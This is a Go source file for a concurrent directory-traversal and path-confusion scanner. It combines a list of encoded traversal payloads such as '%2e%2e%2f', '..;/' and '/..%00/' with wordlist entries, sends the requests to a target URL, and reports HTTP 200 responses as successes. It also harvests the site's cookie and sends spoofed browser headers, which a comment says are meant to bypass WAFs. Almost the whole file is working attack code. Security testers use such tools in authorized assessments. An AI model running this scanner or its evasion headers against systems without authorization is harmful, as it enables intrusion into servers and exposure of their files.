package http

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

var dirTraversalPayloads = []string{
	"%2e%2e",
	"%2F",
	"%2e%2F",
	"%2f%2e",
	"%2e%2e%2f",
	"%2e%2e%2f%2e%2e%2f",
	"%2f%2e%2e%2f",
	"%2f%2e%2e",
	"%252e%252e%252f",
	"..;/",
	".;/",
	"../",
	"..../",
	"....//",
	"/..;/",
	"/../",
	"/..%00/",
	"/./",
	"%3f",
	"%5c",
	"%252f",
	"/%2e%2e/",
	";/../",
	"././",
	"%5c%2e%2e%5c",
	"..;/..",
}

type dirTraversalResult struct {
	URL     string
	Word    string
	Payload string
	Success bool
}

// DirTraversal performs directory traversal testing on the target URL
func PathConfusion(URL string, wordlistPath string, threads int) {
	URL = strings.TrimSuffix(URL, "/")
	if !strings.HasPrefix(URL, "http://") && !strings.HasPrefix(URL, "https://") {
		URL = "https://" + URL
	}
	
	fmt.Printf("Target URL: %s\n", URL)
	fmt.Printf("Wordlist: %s\n", wordlistPath)
	fmt.Printf("Concurrent threads: %d\n", threads)
	fmt.Println()

	// Step 1 & 2: Send HEAD request and collect cookie
	cookie := getCookieFromHead(URL)
	if cookie != "" {
		fmt.Printf("Cookie collected: %s\n", cookie)
	} else {
		fmt.Println("No cookie found in response")
	}
	fmt.Println()

	// Step 3: Create custom headers
	headers := createTraversalHeaders(cookie)

	// Step 5: Load wordlist
	wordlist, err := loadWordlistFile(wordlistPath)
	if err != nil {
		fmt.Printf("Error loading wordlist: %v\n", err)
		return
	}

	fmt.Printf("Loaded %d entries from wordlist\n", len(wordlist))
	fmt.Println("Testing URLs...")
	fmt.Println()

	// Step 6 & 7: Test combinations concurrently
	startTime := time.Now()
	results := testTraversalConcurrently(URL, wordlist, headers, threads)
	duration := time.Since(startTime)

	// Print results
	successCount := 0
	for _, result := range results {
		if result.Success {
			fmt.Printf("✓ SUCCESS: %s (word: %s, payload: %s)\n",
				result.URL, result.Word, result.Payload)
			successCount++
		}
	}

	totalTests := len(wordlist) * len(dirTraversalPayloads)
	fmt.Printf("\nTesting completed in %v: %d successful URLs found out of %d total tests\n",
		duration, successCount, totalTests)
	fmt.Printf("Average speed: %.2f requests/second\n", float64(totalTests)/duration.Seconds())
}

func testTraversalConcurrently(baseURL string, wordlist []string, headers map[string]string, threads int) []dirTraversalResult {
	jobs := make(chan dirTraversalResult, len(wordlist)*len(dirTraversalPayloads))
	results := make(chan dirTraversalResult, len(wordlist)*len(dirTraversalPayloads))

	// Create all test jobs
	go func() {
		for _, word := range wordlist {
			for _, payload := range dirTraversalPayloads {
				testURL := fmt.Sprintf("%s/%s/%s", baseURL, word, payload)
				jobs <- dirTraversalResult{
					URL:     testURL,
					Word:    word,
					Payload: payload,
				}
			}
		}
		close(jobs)
	}()

	// Worker pool
	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go dirTraversalWorker(jobs, results, headers, &wg)
	}

	// Close results when all workers are done
	go func() {
		wg.Wait()
		close(results)
	}()

	// Collect results
	var allResults []dirTraversalResult
	for result := range results {
		allResults = append(allResults, result)
	}

	return allResults
}

func dirTraversalWorker(jobs <-chan dirTraversalResult, results chan<- dirTraversalResult, headers map[string]string, wg *sync.WaitGroup) {
	defer wg.Done()

	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 100,
			IdleConnTimeout:     90 * time.Second,
		},
	}

	for job := range jobs {
		req, err := http.NewRequest("GET", job.URL, nil)
		if err != nil {
			results <- job
			continue
		}

		// Add custom headers
		for key, value := range headers {
			req.Header.Set(key, value)
		}

		resp, err := client.Do(req)
		if err != nil {
			results <- job
			continue
		}

		if resp.StatusCode == 200 {
			job.Success = true
		}
		resp.Body.Close()

		results <- job
	}
}

func getCookieFromHead(url string) string {
	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	resp, err := client.Head(url)
	if err != nil {
		fmt.Printf("Error sending HEAD request: %v\n", err)
		return ""
	}
	defer resp.Body.Close()

	setCookies := resp.Header.Get("Set-Cookie")
	if setCookies == "" {
		return ""
	}

	// Extract first part of set-cookie value (before first semicolon)
	parts := strings.Split(setCookies, ";")
	if len(parts) > 0 {
		return strings.TrimSpace(parts[0])
	}

	return ""
}

func createTraversalHeaders(cookie string) map[string]string {
	// Using legitimate headers to bypass WAFs
	headers := map[string]string{
		"User-Agent":                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
		"Accept":                    "*/*",
		"Accept-Language":           "en-US,fa-IR;q=0.5",
		"Accept-Encoding":           "gzip, deflate, br, zstd",
		"Connection":                "keep-alive",
		"Upgrade-Insecure-Requests": "1",
		"Sec-Fetch-Dest":            "script",
		"Sec-Fetch-Mode":            "no-cors",
		"Sec-Fetch-Site":            "cross-site",
		"DNT":                       "1",
		"Sec-GPC":                   "1",
		"Priority":                  "u=0, i",
		"Te":                        "trailers",
	}

	if cookie != "" {
		headers["Cookie"] = cookie
	}

	return headers
}

func loadWordlistFile(filepath string) ([]string, error) {
	file, err := os.Open(filepath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var words []string
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		word := strings.TrimSpace(scanner.Text())
		if word != "" && !strings.HasPrefix(word, "#") {
			words = append(words, word)
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return words, nil
}
